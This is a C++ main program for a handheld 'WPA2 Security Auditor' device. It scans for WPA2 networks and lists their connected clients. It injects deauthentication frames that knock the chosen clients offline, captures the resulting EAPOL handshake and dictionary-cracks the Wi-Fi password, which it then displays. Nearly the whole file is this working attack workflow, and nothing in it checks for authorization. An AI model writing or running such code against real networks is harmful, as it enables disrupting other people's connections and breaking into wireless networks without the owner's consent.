#include "hardware.h"
#include "wifi.h"
#include "cracker.h"
#include <iostream>
#include <vector>
#include <algorithm>
#include <unistd.h>
#include <signal.h>
#include <cstring>

// ==================== Constants ====================
const int SCAN_CHANNELS[] = {1, 3, 5, 7, 9, 11};
const int CHANNEL_COUNT = 6;
const int CHANNEL_DWELL_MS = 500000; // 0.5 seconds in microseconds
const int RESCAN_INTERVAL_SEC = 15;

// ==================== Global Objects (for signal handling) ====================
LEDController* g_leds = nullptr;
WiFiController* g_wifi = nullptr;
OLEDDisplay* g_oled = nullptr;

void signal_handler(int signum) {
    std::cout << "\n[INFO] Signal " << signum << " received, cleaning up..." << std::endl;
    if (g_leds) g_leds->all_off();
    if (g_oled) g_oled->clear();
    if (g_wifi) delete g_wifi;
    exit(signum);
}

// ==================== Helper Functions ====================
bool is_network_duplicate(const std::vector<WiFiNetwork>& networks, const WiFiNetwork& net) {
    for (const auto& existing : networks) {
        if (compare_mac(existing.bssid, net.bssid)) {
            return true;
        }
    }
    return false;
}

bool scan_for_networks(WiFiController& wifi, std::vector<WiFiNetwork>& networks,
                       OLEDDisplay& oled, LEDController& leds, ButtonController& buttons) {
    std::cout << "\n[STATE] Starting beacon scan..." << std::endl;

    networks.clear();
    leds.set_blink(LEDController::YELLOW, 500);
    oled.show_scanning(0);

    int total_packets = 0;
    int beacon_packets = 0;

    for (int ch_idx = 0; ch_idx < CHANNEL_COUNT; ch_idx++) {
        int channel = SCAN_CHANNELS[ch_idx];

        // Check if channel switch succeeded
        if (!wifi.set_channel(channel)) {
            std::cerr << "[ERROR] Failed to switch to channel " << channel << ", skipping..." << std::endl;
            continue;
        }

        std::cout << "[SCAN] Channel " << channel << "..." << std::endl;

        // Capture for 500ms on this channel
        time_t start = time(NULL);
        time_t deadline = start + 1; // Actually ~500ms with processing time
        int channel_packets = 0;

        while (time(NULL) < deadline) {
            // Check for double ESC to abort scan
            auto btn = buttons.get_press();
            if (btn == ButtonController::ESC && buttons.check_double_esc()) {
                std::cout << "[INPUT] Double ESC - aborting scan" << std::endl;
                return false; // Scan aborted
            }

            struct pcap_pkthdr* header;
            const u_char* packet;

            int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
            if (res == 1) {
                // Got a packet
                total_packets++;
                channel_packets++;

                // Strip radiotap header to get raw 802.11 frame
                const uint8_t* frame = nullptr;
                int frame_len = 0;

                if (!normalize_80211_frame(wifi.get_handle(),
                                          (const uint8_t*)packet,
                                          header->len,
                                          frame,
                                          frame_len)) {
                    continue;
                }

                if (PacketProcessor::is_beacon_frame(frame, frame_len)) {
                    beacon_packets++;
                    WiFiNetwork net;
                    net.channel = channel;
                    net.last_seen = time(NULL);

                    if (PacketProcessor::parse_beacon(frame, frame_len, net)) {
                        if (!is_network_duplicate(networks, net)) {
                            networks.push_back(net);
                            std::cout << "[BEACON] Found WPA2 network: "
                                      << net.get_display_ssid()
                                      << " [" << mac_to_string(net.bssid) << "] "
                                      << "on channel " << channel << std::endl;
                            oled.show_scanning(networks.size());
                        }
                    }
                }
            } else if (res == -1) {
                std::cerr << "[ERROR] pcap_next_ex error: " << pcap_geterr(wifi.get_handle()) << std::endl;
            }
            usleep(10000); // 10ms
        }

        std::cout << "[DEBUG] Channel " << channel << ": captured " << channel_packets << " packets" << std::endl;
    }

    std::cout << "[SCAN] Complete. Found " << networks.size() << " WPA2 networks" << std::endl;
    std::cout << "[DEBUG] Total packets: " << total_packets << ", Beacon frames: " << beacon_packets << std::endl;
    return true; // Scan completed successfully
}

bool find_clients(WiFiController& wifi, const WiFiNetwork& target, 
                 std::vector<ClientDevice>& clients, int timeout_sec) {
    std::cout << "[INFO] Scanning for clients on " << target.get_display_ssid() << std::endl;
    
    clients.clear();
    wifi.set_channel(target.channel);
    
    time_t start = time(NULL);
    time_t deadline = start + timeout_sec;
    
    while (time(NULL) < deadline) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        
        int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
        if (res == 1) {
            // Strip radiotap header to get raw 802.11 frame
            const uint8_t* frame = nullptr;
            int frame_len = 0;

            if (!normalize_80211_frame(wifi.get_handle(),
                                      (const uint8_t*)packet,
                                      header->len,
                                      frame,
                                      frame_len)) {
                continue;
            }

            if (PacketProcessor::is_data_frame(frame, frame_len)) {
                uint8_t ap_mac[6], client_mac[6];
                PacketProcessor::extract_addresses(frame, frame_len, ap_mac, client_mac);

                // Check if this is for our target AP
                if (compare_mac(ap_mac, target.bssid)) {
                    // Check if client already in list
                    bool found = false;
                    for (auto& client : clients) {
                        if (compare_mac(client.mac, client_mac)) {
                            client.last_seen = time(NULL);
                            client.packet_count++;
                            found = true;
                            break;
                        }
                    }

                    if (!found) {
                        ClientDevice client;
                        memcpy(client.mac, client_mac, 6);
                        client.last_seen = time(NULL);
                        client.packet_count = 1;
                        clients.push_back(client);
                        std::cout << "[CLIENT] Found: " << mac_to_string(client_mac) << std::endl;
                    }
                }
            }
        }
        usleep(10000);
    }
    
    std::cout << "[INFO] Found " << clients.size() << " clients" << std::endl;
    return !clients.empty();
}

bool capture_handshake(WiFiController& wifi, WiFiNetwork& target, 
                      OLEDDisplay& oled, LEDController& leds,
                      ButtonController& buttons, bool send_deauth,
                      const std::vector<ClientDevice>* target_clients) {
    std::cout << "\n[STATE] Capturing handshake for " << target.get_display_ssid() << std::endl;
    
    wifi.set_channel(target.channel);
    leds.set_blink(LEDController::BLUE, 500);
    
    std::string mode = send_deauth ? "Deauth Attack" : "Waiting Handshake";
    oled.show_capturing(mode, target.get_display_ssid());
    
    // Send deauth packets if requested
    if (send_deauth && target_clients && !target_clients->empty()) {
        std::cout << "[INFO] Sending deauth packets..." << std::endl;

        for (const auto& client : *target_clients) {
            auto deauth_frame = PacketProcessor::craft_deauth_frame(target.bssid, client.mac);

            std::cout << "[DEBUG] Deauth frame details:" << std::endl;
            std::cout << "[DEBUG]   Frame size: " << deauth_frame.size() << " bytes" << std::endl;
            std::cout << "[DEBUG]   Target AP (BSSID): " << mac_to_string(target.bssid) << std::endl;
            std::cout << "[DEBUG]   Target Client: " << mac_to_string(client.mac) << std::endl;
            std::cout << "[DEBUG]   Frame hex dump: ";
            for (size_t i = 0; i < deauth_frame.size(); i++) {
                printf("%02X ", deauth_frame[i]);
            }
            std::cout << std::endl;

            // Send multiple deauth frames
            for (int i = 0; i < 5; i++) {
                int sent = pcap_inject(wifi.get_handle(), deauth_frame.data(), deauth_frame.size());
                std::cout << "[DEBUG] pcap_inject returned: " << sent << " bytes" << std::endl;
                if (sent < 0) {
                    std::cerr << "[ERROR] pcap_inject failed: " << pcap_geterr(wifi.get_handle()) << std::endl;
                }
                usleep(100000); // 100ms between packets
            }
            std::cout << "[DEAUTH] Sent 5 packets to " << mac_to_string(client.mac) << std::endl;
        }

        std::cout << "[INFO] Deauth packets sent, waiting for handshake..." << std::endl;
    }
    
    // Wait for handshake (max 60 seconds)
    time_t start = time(NULL);
    time_t deadline = start + 60;
    
    while (time(NULL) < deadline) {
        // Check for double ESC
        auto btn = buttons.get_press();
        if (btn == ButtonController::ESC && buttons.check_double_esc()) {
            std::cout << "[INPUT] Double ESC - returning to scan" << std::endl;
            return false;
        }
        
        struct pcap_pkthdr* header;
        const u_char* packet;
        
        int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
        if (res == 1) {
            // Strip radiotap header to get raw 802.11 frame
            const uint8_t* frame = nullptr;
            int frame_len = 0;

            if (!normalize_80211_frame(wifi.get_handle(),
                                      (const uint8_t*)packet,
                                      header->len,
                                      frame,
                                      frame_len)) {
                continue;
            }

            if (PacketProcessor::is_eapol_frame(frame, frame_len)) {
                int msg_type = PacketProcessor::get_eapol_message_type(frame, frame_len);

                if (msg_type == 1) {
                    std::cout << "[EAPOL] Captured Message 1" << std::endl;
                    PacketProcessor::parse_eapol_msg1(frame, frame_len, target);
                    target.has_msg1 = true;
                } else if (msg_type == 2) {
                    std::cout << "[EAPOL] Captured Message 2" << std::endl;
                    target.has_msg2 = PacketProcessor::parse_eapol_msg2(frame, frame_len, target);
                }

                // Check if we have complete handshake
                if (target.handshake_complete()) {
                    std::cout << "[SUCCESS] Complete handshake captured!" << std::endl;
                    std::cout << "[INFO] AP: " << mac_to_string(target.ap_mac) << std::endl;
                    std::cout << "[INFO] Client: " << mac_to_string(target.client_mac) << std::endl;
                    return true;
                }
            }
        }
        
        usleep(10000);
    }
    
    std::cout << "[TIMEOUT] Handshake capture timed out" << std::endl;
    return false;
}

// ==================== Main Application ====================
int main() {
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    std::cout << "========================================" << std::endl;
    std::cout << "    WPA2 Security Auditor v1.0" << std::endl;
    std::cout << "    NXP i.MX93 EVK Platform" << std::endl;
    std::cout << "========================================\n" << std::endl;
    
    try {
        // Initialize hardware
        LEDController leds;
        ButtonController buttons;
        OLEDDisplay oled;
        WiFiController wifi("wlan0");
        WPA2Cracker cracker;
        
        g_leds = &leds;
        g_wifi = &wifi;
        g_oled = &oled;
        
        // Setup monitor mode
        std::cout << "[INIT] Setting up AR9271 WiFi adapter..." << std::endl;
        if (!wifi.setup_monitor_mode()) {
            std::cerr << "[FATAL] Failed to setup monitor mode" << std::endl;
            oled.show_message("ERROR", {"Monitor mode", "failed"});
            leds.set_solid(LEDController::RED, true);
            return 1;
        }

        // Set initial channel before opening pcap
        std::cout << "[INIT] Setting initial channel..." << std::endl;
        if (!wifi.set_channel(1)) {
            std::cerr << "[FATAL] Failed to set initial channel" << std::endl;
            oled.show_message("ERROR", {"Channel switch", "failed"});
            leds.set_solid(LEDController::RED, true);
            return 1;
        }

        // Small delay to let channel switch settle
        usleep(100000);

        // Open packet capture
        // More permissive filter - capture all management and data frames
        if (!wifi.open_capture("")) {
            std::cerr << "[FATAL] Failed to open packet capture" << std::endl;
            oled.show_message("ERROR", {"Packet capture", "failed"});
            leds.set_solid(LEDController::RED, true);
            return 1;
        }
        
        // Show startup menu
        std::cout << "[STATE] Showing startup menu" << std::endl;
        std::vector<std::string> startup_menu = {
            "Start Capturing",
            "Exit Program"
        };
        int selection = 0;
        oled.show_menu(startup_menu, selection);
        
        // Wait for user selection
        bool menu_waiting = true;
        while (menu_waiting) {
            auto btn = buttons.get_press();
            if (btn == ButtonController::UP) {
                selection = 0;
                oled.show_menu(startup_menu, selection);
                std::cout << "[INPUT] Selected: Start Capturing" << std::endl;
            } else if (btn == ButtonController::DOWN) {
                selection = 1;
                oled.show_menu(startup_menu, selection);
                std::cout << "[INPUT] Selected: Exit Program" << std::endl;
            } else if (btn == ButtonController::SELECT) {
                if (selection == 1) {
                    std::cout << "[INFO] User chose to exit" << std::endl;
                    leds.all_off();
                    oled.clear();
                    return 0;
                }
                menu_waiting = false;
            }
            usleep(100000);
        }
        
        // Main application loop
        std::vector<WiFiNetwork> networks;
        time_t last_scan_time = 0;
        
        while (true) {
            // Scan for networks
            bool scan_completed = scan_for_networks(wifi, networks, oled, leds, buttons);
            last_scan_time = time(NULL);

            // Check if scan was aborted
            if (!scan_completed) {
                std::cout << "[INFO] Scan aborted by user" << std::endl;
                leds.all_off();
                oled.clear();
                return 0;
            }

            if (networks.empty()) {
                std::cout << "[INFO] No WPA2 networks found" << std::endl;
                oled.show_message("No Networks", {"No WPA2 found", "SELECT=Rescan", "ESC ESC=Exit"});

                // Wait for user input
                bool waiting_input = true;
                while (waiting_input) {
                    auto btn = buttons.get_press();
                    if (btn == ButtonController::SELECT) {
                        // User wants to rescan
                        std::cout << "[INPUT] User chose to rescan" << std::endl;
                        waiting_input = false;
                    } else if (btn == ButtonController::ESC) {
                        if (buttons.check_double_esc()) {
                            std::cout << "[INPUT] Double ESC - exiting program" << std::endl;
                            leds.all_off();
                            oled.clear();
                            return 0;
                        }
                    }
                    usleep(100000); // 100ms
                }
                continue;
            }
            
            // Show network list with rescan option
            std::vector<std::string> menu_items;
            menu_items.push_back("Re-scan beacons");
            for (const auto& net : networks) {
                menu_items.push_back(net.get_display_ssid());
            }
            
            int menu_idx = 0;
            oled.show_menu(menu_items, menu_idx);
            leds.set_solid(LEDController::YELLOW, true);
            
            bool in_network_menu = true;
            time_t menu_start = time(NULL);
            
            while (in_network_menu) {
                // Auto-rescan after 15 seconds of inactivity
                if (time(NULL) - menu_start >= RESCAN_INTERVAL_SEC) {
                    std::cout << "[INFO] Auto-rescanning after " << RESCAN_INTERVAL_SEC << " seconds" << std::endl;
                    break;
                }
                
                auto btn = buttons.get_press();
                if (btn == ButtonController::UP) {
                    menu_idx = (menu_idx - 1 + menu_items.size()) % menu_items.size();
                    oled.show_menu(menu_items, menu_idx);
                    std::cout << "[INPUT] Selected: " << menu_items[menu_idx] << std::endl;
                    menu_start = time(NULL); // Reset timer
                } else if (btn == ButtonController::DOWN) {
                    menu_idx = (menu_idx + 1) % menu_items.size();
                    oled.show_menu(menu_items, menu_idx);
                    std::cout << "[INPUT] Selected: " << menu_items[menu_idx] << std::endl;
                    menu_start = time(NULL); // Reset timer
                } else if (btn == ButtonController::SELECT) {
                    if (menu_idx == 0) {
                        // Re-scan
                        std::cout << "[INPUT] User chose to re-scan" << std::endl;
                        break;
                    } else {
                        // Selected a network
                        WiFiNetwork& target = networks[menu_idx - 1];
                        std::cout << "[INPUT] User selected: " << target.get_display_ssid() << std::endl;
                        
                        // Show SSID options: deauth attack or wait for handshake
                        std::vector<std::string> ssid_menu = {
                            "Deauth Attack",
                            "Wait Handshake"
                        };
                        int ssid_idx = 0;
                        oled.show_menu(ssid_menu, ssid_idx);
                        
                        bool in_ssid_menu = true;
                        while (in_ssid_menu) {
                            auto ssid_btn = buttons.get_press();
                            if (ssid_btn == ButtonController::UP) {
                                ssid_idx = 0;
                                oled.show_menu(ssid_menu, ssid_idx);
                            } else if (ssid_btn == ButtonController::DOWN) {
                                ssid_idx = 1;
                                oled.show_menu(ssid_menu, ssid_idx);
                            } else if (ssid_btn == ButtonController::ESC) {
                                // Go back to network list
                                oled.show_menu(menu_items, menu_idx);
                                in_ssid_menu = false;
                            } else if (ssid_btn == ButtonController::SELECT) {
                                std::vector<ClientDevice> clients;
                                
                                if (ssid_idx == 0) {
                                    // Deauth attack - need to find clients first
                                    std::cout << "[STATE] Scanning for clients..." << std::endl;
                                    oled.show_message("Scanning", {"Finding clients..."});
                                    
                                    if (!find_clients(wifi, target, clients, 5)) {
                                        std::cout << "[INFO] No clients detected" << std::endl;
                                        oled.show_message("No Clients", {"None detected", "Press SELECT"});
                                        
                                        // Wait for button press
                                        while (buttons.get_press() != ButtonController::SELECT) {
                                            usleep(100000);
                                        }
                                        oled.show_menu(menu_items, menu_idx);
                                        in_ssid_menu = false;
                                        continue;
                                    }
                                    
                                    // Show client selection menu
                                    std::vector<std::string> client_menu;
                                    client_menu.push_back("All Clients");
                                    client_menu.push_back("Random Client");
                                    for (const auto& client : clients) {
                                        client_menu.push_back(mac_to_string(client.mac));
                                    }
                                    
                                    int client_idx = 0;
                                    oled.show_menu(client_menu, client_idx);
                                    
                                    bool in_client_menu = true;
                                    while (in_client_menu) {
                                        auto client_btn = buttons.get_press();
                                        if (client_btn == ButtonController::UP) {
                                            client_idx = (client_idx - 1 + client_menu.size()) % client_menu.size();
                                            oled.show_menu(client_menu, client_idx);
                                        } else if (client_btn == ButtonController::DOWN) {
                                            client_idx = (client_idx + 1) % client_menu.size();
                                            oled.show_menu(client_menu, client_idx);
                                        } else if (client_btn == ButtonController::ESC) {
                                            // Return to rescan state
                                            in_client_menu = false;
                                            in_ssid_menu = false;
                                            in_network_menu = false;
                                        } else if (client_btn == ButtonController::SELECT) {
                                            std::vector<ClientDevice> target_clients;
                                            
                                            if (client_idx == 0) {
                                                // All clients
                                                target_clients = clients;
                                            } else if (client_idx == 1) {
                                                // Random client
                                                target_clients.push_back(clients[rand() % clients.size()]);
                                            } else {
                                                // Specific client
                                                target_clients.push_back(clients[client_idx - 2]);
                                            }
                                            
                                            // Capture handshake with deauth
                                            bool success = capture_handshake(wifi, target, oled, leds, 
                                                                            buttons, true, &target_clients);
                                            
                                            if (success) {
                                                // Handshake captured!
                                                goto handshake_success;
                                            } else {
                                                // Return to rescan
                                                in_client_menu = false;
                                                in_ssid_menu = false;
                                                in_network_menu = false;
                                            }
                                        }
                                        usleep(100000);
                                    }
                                } else {
                                    // Wait for handshake (no deauth)
                                    bool success = capture_handshake(wifi, target, oled, leds, 
                                                                    buttons, false, nullptr);
                                    
                                    if (success) {
                                        goto handshake_success;
                                    } else {
                                        // Return to rescan
                                        in_ssid_menu = false;
                                        in_network_menu = false;
                                    }
                                }
                            }
                            usleep(100000);
                        }
                    }
                    menu_start = time(NULL); // Reset timer
                }
                
                usleep(100000);
            }
            
            continue;
            
handshake_success:
            // We have a complete handshake!
            WiFiNetwork& captured_net = networks[menu_idx - 1];
            
            std::cout << "\n[SUCCESS] Handshake captured successfully!" << std::endl;
            cracker.log_handshake_info(captured_net);
            
            leds.set_solid(LEDController::BLUE, true);
            oled.show_message("Success!", {"Handshake captured", "Choose dictionary"});
            sleep(2);
            
            // Show dictionary selection
            std::vector<std::string> dict_menu = {
                "Short Dictionary",
                "Medium Dictionary",
                "Large Dictionary"
            };
            int dict_idx = 0;
            oled.show_menu(dict_menu, dict_idx);
            
            bool in_dict_menu = true;
            while (in_dict_menu) {
                auto dict_btn = buttons.get_press();
                if (dict_btn == ButtonController::UP) {
                    dict_idx = (dict_idx - 1 + 3) % 3;
                    oled.show_menu(dict_menu, dict_idx);
                } else if (dict_btn == ButtonController::DOWN) {
                    dict_idx = (dict_idx + 1) % 3;
                    oled.show_menu(dict_menu, dict_idx);
                } else if (dict_btn == ButtonController::SELECT) {
                    std::string dict_file;
                    switch (dict_idx) {
                        case 0: dict_file = "dictionary_short.txt"; break;
                        case 1: dict_file = "dictionary_medium.txt"; break;
                        case 2: dict_file = "dictionary_large.txt"; break;
                    }
                    
                    std::cout << "[STATE] Starting crack with " << dict_file << std::endl;
                    leds.set_blink(LEDController::RED, 1000);
                    
                    // Progress callback
                    int last_progress = 0;
                    auto progress_cb = [&](int attempts, const std::string& pwd) {
                        // Update OLED every 500 passwords
                        if (attempts % 500 == 0) {
                            int progress = (attempts / 500) % 100;
                            oled.show_cracking(progress, attempts);
                        }
                        
                        // Check for double ESC
                        auto btn = buttons.get_press();
                        if (btn == ButtonController::ESC && buttons.check_double_esc()) {
                            std::cout << "[INPUT] Double ESC - aborting crack" << std::endl;
                            throw std::runtime_error("User abort");
                        }
                    };
                    
                    try {
                        std::string password = cracker.crack(captured_net, dict_file, progress_cb);
                        
                        if (!password.empty()) {
                            // Success!
                            std::cout << "\n[FINAL] Password: " << password << std::endl;
                            leds.set_blink(LEDController::GREEN, 1000);
                            oled.show_success(password);
                            
                            // Wait for user action
                            bool in_success_menu = true;
                            std::vector<std::string> success_menu = {"Re-scan", "Exit"};
                            int success_idx = 0;
                            
                            while (in_success_menu) {
                                auto final_btn = buttons.get_press();
                                if (final_btn == ButtonController::UP || final_btn == ButtonController::DOWN) {
                                    success_idx = 1 - success_idx;
                                } else if (final_btn == ButtonController::SELECT) {
                                    if (success_idx == 1) {
                                        // Exit
                                        leds.all_off();
                                        oled.clear();
                                        return 0;
                                    }
                                    in_success_menu = false;
                                    in_dict_menu = false;
                                    in_network_menu = false;
                                }
                                usleep(100000);
                            }
                        } else {
                            // Failed
                            leds.set_solid(LEDController::RED, true);
                            oled.show_failure();
                            
                            // Wait for user action
                            bool in_fail_menu = true;
                            while (in_fail_menu) {
                                auto fail_btn = buttons.get_press();
                                if (fail_btn == ButtonController::SELECT) {
                                    in_fail_menu = false;
                                    in_dict_menu = false;
                                    in_network_menu = false;
                                }
                                usleep(100000);
                            }
                        }
                    } catch (const std::runtime_error& e) {
                        // User aborted - return to rescan
                        std::cout << "[INFO] Crack aborted, returning to scan" << std::endl;
                        in_dict_menu = false;
                        in_network_menu = false;
                    }
                }
                usleep(100000);
            }
        }
        
    } catch (const std::exception& e) {
        std::cerr << "[FATAL] Exception: " << e.what() << std::endl;
        if (g_leds) g_leds->all_off();
        if (g_oled) g_oled->clear();
        return 1;
    }
    
    return 0;
}
